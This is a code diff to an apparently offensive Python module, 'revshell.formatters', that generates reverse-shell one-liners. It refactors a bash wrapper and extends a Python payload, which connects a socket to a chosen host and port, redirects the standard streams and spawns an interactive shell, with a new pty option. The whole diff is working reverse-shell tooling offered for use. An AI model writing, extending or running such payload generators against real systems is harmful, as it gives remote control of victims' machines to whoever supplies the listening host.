@@ -1,5 +1,5 @@
 import random
-from shlex import quote
+import shlex
 
 from revshell.formatters import register
 
@@ -21,26 +21,39 @@ def reverse_bash(
     if bash_path is None:
         return cmd
     bash_path = bash_path or '/bin/bash'
-    return f"{bash_path} -c {quote(cmd)}"
+    return f"{bash_path} -c {shlex.quote(cmd)}"
 
 
 @register
 def reverse_python(
-    lhost: str, lport: int, *, py_path="python3", shell_path="sh"
+    lhost: str,
+    lport: int,
+    *,
+    py_path="python3",
+    shell_path="sh -i",
+    pty=False,
 ) -> str:
     """Connect back and create a command shell via Python"""
     py_path = py_path or 'python3'
     shell_path = shell_path or '/bin/sh'
+
+    import_stmts = ["os", "socket", "subprocess"]
+    invocation = "subprocess.call({!r})".format(shlex.split(shell_path))
+
+    if pty:
+        import_stmts[-1] = "pty"
+        invocation = "pty.spawn({!r})".format(shell_path)
+
     return "{0} -c {cmd}".format(
         py_path,
-        cmd=quote(
+        cmd=shlex.quote(
             ";".join(
                 [
-                    "import os,socket,subprocess",
+                    "import %s" % ",".join(import_stmts),
                     "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)",
                     f's.connect(("{lhost}",{lport}))',
                     "[os.dup2(s.fileno(),h) for h in (0,1,2)]",
-                    f'subprocess.call(["{shell_path}","-i"])',
+                    invocation,
                 ]
             )
         ),
